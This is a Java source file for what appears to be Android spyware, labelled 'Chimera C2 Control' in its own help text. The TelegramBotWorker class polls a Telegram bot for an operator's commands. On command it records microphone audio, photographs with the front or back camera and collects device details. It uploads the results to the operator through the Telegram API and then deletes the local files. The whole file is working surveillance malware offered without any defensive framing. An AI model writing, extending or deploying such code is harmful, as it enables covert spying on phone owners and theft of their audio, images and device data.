package com.chimera;

import android.content.Context;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramBotWorker implements Runnable {
    private final Context context;
    private long lastUpdateId = 0;

    public TelegramBotWorker(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public void run() {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                pollForUpdates();
                Thread.sleep(3000);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                break;
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
                try {
                    Thread.sleep(30000);
                } catch (InterruptedException interruptedException) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }
    }

    private void pollForUpdates() {
        HttpURLConnection conn = null;
        try {
            String token = ConfigLoader.getBotToken();
            long adminId = ConfigLoader.getAdminId();
            if (token == null || adminId == 0) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=20&allowed_updates=[\"message\",\"callback_query\"]";
            if (lastUpdateId > 0) {
                urlStr += "&offset=" + (lastUpdateId + 1);
            }
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(25000);
            conn.setReadTimeout(25000);

            if (conn.getResponseCode() != HttpURLConnection.HTTP_OK) return;

            InputStream is = conn.getInputStream();
            ByteArrayOutputStream result = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) != -1) {
                result.write(buffer, 0, length);
            }
            String responseStr = result.toString("UTF-8");
            is.close();

            JSONObject responseJson = new JSONObject(responseStr);
            if (!responseJson.getBoolean("ok")) return;

            JSONArray updates = responseJson.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject update = updates.getJSONObject(i);
                lastUpdateId = update.getLong("update_id");
                if (update.has("message")) {
                    handleMessage(update.getJSONObject("message"));
                } else if (update.has("callback_query")) {
                    handleCallback(update.getJSONObject("callback_query"));
                }
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_Poll", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private void handleMessage(JSONObject msg) {
        try {
            if (!msg.has("text")) return;
            String text = msg.getString("text");
            long chatId = msg.getJSONObject("chat").getLong("id");
            if (chatId != ConfigLoader.getAdminId()) return;

            String[] parts = text.split(" ");
            String command = parts[0].toLowerCase();

            switch (command) {
                case "/start":
                case "/help":
                    sendHelpMessage(chatId);
                    break;
                case "/command":
                    sendMenu(chatId);
                    break;
                case "/mic":
                    int duration = 30;
                    if (parts.length > 1) {
                        try {
                            duration = Integer.parseInt(parts[1]);
                        } catch (NumberFormatException e) {
                            duration = 30;
                        }
                    }

                    final int finalDuration = duration;
                    sendMessage("Recording " + finalDuration + " seconds of audio...", context);
                    AudioHandler.startRecording(context, finalDuration, new AudioHandler.AudioCallback() {
                        @Override
                        public void onRecordingFinished(String filePath) {
                            uploadAudio(filePath, ConfigLoader.getAdminId(), finalDuration + "s Audio Recording", context);
                        }
                        @Override
                        public void onError(String error) {
                            sendMessage("Audio Error: " + error, context);
                        }
                    });
                    break;
                case "/device_details":
                    sendMessage("Gathering device intelligence...", context);
                    DeviceDetailsHelper.getDeviceDetails(context, details -> sendMessage(details, context));
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
        }
    }

    private void handleCallback(JSONObject cb) {
        try {
            String data = cb.getString("data");
            switch (data) {
                case "CAM1":
                case "CAM2":
                    sendMessage("Taking picture with " + data + "...", context);
                    CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                        @Override
                        public void onPictureTaken(String filePath) {
                            uploadPhoto(filePath, ConfigLoader.getAdminId(), data + " Picture", context);
                        }
                        @Override
                        public void onError(String error) {
                            sendMessage("Camera Error: " + error, context);
                        }
                    });
                    break;
            }
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
        }
    }

    private void sendHelpMessage(long chatId) {
        String helpText = "Chimera C2 Control\n\n"
                + "/command - Show camera command menu.\n"
                + "/mic <seconds> - Record audio (e.g., /mic 60).\n"
                + "/device_details - Get full device intel report.\n"
                + "/help - Show this message.";
        sendMessage(helpText, context);
    }

    private void sendMenu(long chatId) {
        try {
            JSONObject keyboard = new JSONObject();
            JSONArray row1 = new JSONArray().put(
                new JSONObject().put("text", "\uD83D\uDCF7 Front Cam").put("callback_data", "CAM1")
            ).put(
                new JSONObject().put("text", "\uD83D\uDCF8 Back Cam").put("callback_data", "CAM2")
            );
            keyboard.put("inline_keyboard", new JSONArray().put(row1));
            JSONObject body = new JSONObject();
            body.put("chat_id", chatId);
            body.put("text", "Select Camera Command:");
            body.put("reply_markup", keyboard);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
        }
    }

    public static void sendMessage(String message, Context context) {
        try {
            JSONObject body = new JSONObject();
            body.put("chat_id", ConfigLoader.getAdminId());
            body.put("text", message);
            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
        } catch (Exception e) {
            ErrorLogger.logError(context, "TelegramBotWorker_SendMessageHelper", e);
        }
    }

    public static void post(String urlStr, String jsonBody, Context context) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    public static void uploadPhoto(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendPhoto", "photo", "image/jpeg");
    }

    public static void uploadAudio(String filePath, long chatId, String caption, Context context) {
        uploadMultipart(filePath, chatId, caption, context, "sendAudio", "audio", "audio/mp4");
    }

    private static void uploadMultipart(String filePath, long chatId, String caption, Context context, String endpoint, String fieldName, String contentType) {
        final File fileToUpload = new File(filePath);
        if (!fileToUpload.exists()) return;
        new Thread(() -> {
            String token = ConfigLoader.getBotToken();
            if (token == null) return;
            String urlStr = "https://api.telegram.org/bot" + token + "/" + endpoint;
            String boundary = "Boundary-" + System.currentTimeMillis();
            String LINE_FEED = "\r\n";
            HttpURLConnection conn = null;
            try {
                URL url = new URL(urlStr);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);
                try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED).append(LINE_FEED);
                    writer.append(String.valueOf(chatId)).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED).append(LINE_FEED);
                    writer.append(caption).append(LINE_FEED);
                    writer.append("--" + boundary).append(LINE_FEED);
                    writer.append("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileToUpload.getName() + "\"").append(LINE_FEED);
                    writer.append("Content-Type: " + contentType).append(LINE_FEED).append(LINE_FEED);
                    writer.flush();
                    try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fis.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                        os.flush();
                    }
                    writer.append(LINE_FEED).flush();
                    writer.append("--" + boundary + "--").append(LINE_FEED);
                }
                conn.getInputStream().close();
            } catch (Exception e) {
                ErrorLogger.logError(context, "TelegramBotWorker_Upload", e);
            } finally {
                if (conn != null) conn.disconnect();
                fileToUpload.delete();
            }
        }).start();
    }
}